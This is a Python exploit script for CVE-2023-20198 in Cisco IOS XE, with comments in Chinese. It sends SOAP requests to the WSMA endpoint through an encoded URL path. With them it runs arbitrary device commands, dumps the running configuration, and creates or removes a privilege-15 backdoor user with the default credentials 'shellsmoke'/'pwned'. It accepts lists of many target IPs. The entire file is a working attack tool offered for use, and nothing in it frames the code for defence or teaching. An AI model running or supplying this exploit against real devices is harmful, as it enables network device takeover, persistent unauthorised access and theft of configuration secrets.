#!/usr/bin/env python3
import requests
import argparse
import ipaddress
import xml.etree.ElementTree as ET
import logging
import logging.config
import urllib3

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志
logging.config.dictConfig({'version': 1, 'disable_existing_loggers': True})
logging.basicConfig(level=logging.INFO, format="%(message)s")

# 模板替换的占位符
CMD_PLACEHOLDER = "<TMPEXECCMD>"
USER_MOD_PLACEHOLDER = "<TMPUSERMOD>"
DEFAULT_USERNAME = "shellsmoke"
DEFAULT_PASSWORD = "pwned"
EXEC_CMD_GET_CONFIG = "sh run"
EXEC_CMD_CHECK_VULN = "uname -a"
EX_URI = '%2577eb%2575i_%2577sma_Http'

# SOAP请求模板
SOAP_TEMPLATE_EXEC = """<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-exec">
<execCLI>
<cmd>{}</cmd>
</execCLI>
</request>
</SOAP:Body>
</SOAP:Envelope>"""

SOAP_TEMPLATE_ADD_USER = """<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-config">
<configApply>
<config-data>
<cli-config-data-block>{}</cli-config-data-block>
</config-data>
</configApply>
</request>
</SOAP:Body>
</SOAP:Envelope>"""


def parse_args():
    parser = argparse.ArgumentParser(description='CVE-2023-20198 Exploit PoC')
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-t', '--target', help='Target IP Address')
    target_group.add_argument('-l', '--target-file', help='File containing IP Addresses')

    action_group = parser.add_mutually_exclusive_group(required=True)
    action_group.add_argument('-c', '--check-vuln', action='store_true', help='Check for vulnerability')
    action_group.add_argument('-g', '--get-config', action='store_true', help='Get Cisco IOS running config')
    action_group.add_argument('-e', '--exec', help='Execute Cisco IOS command')
    action_group.add_argument('-a', '--add-user', action='store_true', help='Add new privileged user')
    action_group.add_argument('-d', '--del-user', action='store_true', help='Delete privileged user')

    parser.add_argument('-u', '--username', help=f'Username for add or delete user (default: {DEFAULT_USERNAME})')
    parser.add_argument('-p', '--password', help=f'Password for new user (default: {DEFAULT_PASSWORD})')
    parser.add_argument('-o', '--output', help='Output file to save results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity')

    args = parser.parse_args()

    # 配置日志详细级别
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    return args


def create_exploit_payload(action, cmd=None, username=None, password=None):
    if action == 'exec':
        return SOAP_TEMPLATE_EXEC.format(cmd)
    elif action in ['add_user', 'del_user']:
        if action == 'add_user':
            user_command = f"username {username} privilege 15 secret {password}"
        else:
            user_command = f"no username {username}"
        return SOAP_TEMPLATE_ADD_USER.format(user_command)


def send_exploit(target_url, payload):
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'User-Agent': 'CVE-2023-20198'
    }
    try:
        response = requests.post(target_url, headers=headers, data=payload, verify=False)
        return response.status_code, response.headers.get('content-type'), response.text
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending request to {target_url}: {e}")
        return None, None, None


def main():
    args = parse_args()

    # 目标URL和协议
    scheme = 'https' if args.check_vuln else 'http'
    targets = []

    if args.target:
        targets.append(args.target)
    elif args.target_file:
        try:
            with open(args.target_file, 'r') as file:
                targets = [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            logging.error(f"Target file {args.target_file} not found.")
            return

    for target in targets:
        try:
            ip = ipaddress.ip_address(target)
        except ValueError:
            logging.error(f"Invalid IP address: {target}")
            continue

        target_url = f"{scheme}://{target}/{EX_URI}"

        if args.check_vuln:
            action = 'exec'
            cmd = EXEC_CMD_CHECK_VULN
        elif args.get_config:
            action = 'exec'
            cmd = EXEC_CMD_GET_CONFIG
        elif args.exec:
            action = 'exec'
            cmd = args.exec
        elif args.add_user:
            action = 'add_user'
            cmd = None
            username = args.username if args.username else DEFAULT_USERNAME
            password = args.password if args.password else DEFAULT_PASSWORD
        elif args.del_user:
            action = 'del_user'
            cmd = None
            username = args.username if args.username else DEFAULT_USERNAME

        # 创建请求载荷
        payload = create_exploit_payload(action, cmd, username, password)

        # 发送请求
        logging.info(f"Sending exploit to {target_url}")
        status_code, content_type, response_text = send_exploit(target_url, payload)

        # 处理响应
        if status_code == 200 and content_type == 'text/xml':
            logging.info(f"Exploit successful for target {target}")
            if action == 'exec':
                try:
                    root = ET.fromstring(response_text)
                    for elem in root.iter():
                        if elem.text:
                            logging.info(elem.text.strip())
                except ET.ParseError as e:
                    logging.error(f"Error parsing XML response: {e}")
        else:
            logging.error(f"Exploit failed for target {target}. Status code: {status_code}")

        # 保存到输出文件
        if args.output:
            try:
                with open(args.output, 'a') as out_file:
                    out_file.write(f"Target: {target}\n")
                    out_file.write(response_text + "\n\n")
            except Exception as e:
                logging.error(f"Error writing to output file: {e}")


if __name__ == "__main__":
    main()
